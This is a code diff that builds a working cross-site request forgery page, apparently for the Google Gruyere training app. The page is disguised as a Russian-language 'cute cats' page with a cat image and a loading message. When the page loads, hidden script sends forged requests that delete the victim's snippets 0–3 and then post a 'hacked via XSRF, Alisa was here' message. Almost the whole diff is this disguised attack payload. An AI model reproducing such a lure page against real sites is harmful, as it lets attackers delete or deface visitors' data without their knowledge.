@@ -1,18 +1,25 @@
-<script>
-function startAttack() {
-  const base = 'https://google-gruyere.appspot.com/643453999600290416051506802884356354571';
-  const indices = [0, 1, 2, 3];
+<!DOCTYPE html>
+<html>
+<head><title>Котики 🐱</title></head>
+<body>
+  <h1>Милые котики</h1>
+  <img src="https://i.imgur.com/8lRrQ.png" alt="Котик">
+  <p>Загрузка...</p>
 
-  // Удаляем ВСЕ сниппеты
-  indices.forEach(index => {
-    const img = new Image();
-    img.src = base + '/deletesnippet?index=' + index + '&t=' + Date.now();
-  });
+  <script>
+    const base = 'https://google-gruyere.appspot.com/643453999600290416051506802884356354571';
 
-  // Создаём свой
-  setTimeout(() => {
-    const create = new Image();
-    create.src = base + '/newsnippet?snippet=' + encodeURIComponent('🔥 ВСЁ УДАЛЕНО. Хакнуто Алисой 😈');
-  }, 1500);
-}
-</script>
+    // Удалить все сниппеты
+    [0,1,2,3].forEach(i => {
+      const img = new Image();
+      img.src = base + '/deletesnippet?index=' + i + '&t=' + Date.now();
+    });
+
+    // Создать свой
+    setTimeout(() => {
+      const create = new Image();
+      create.src = base + '/newsnippet?snippet=' + encodeURIComponent('🔥 Хакнуто через XSRF Алиса была здесь 😈');
+    }, 1000);
+  </script>
+</body>
+</html>
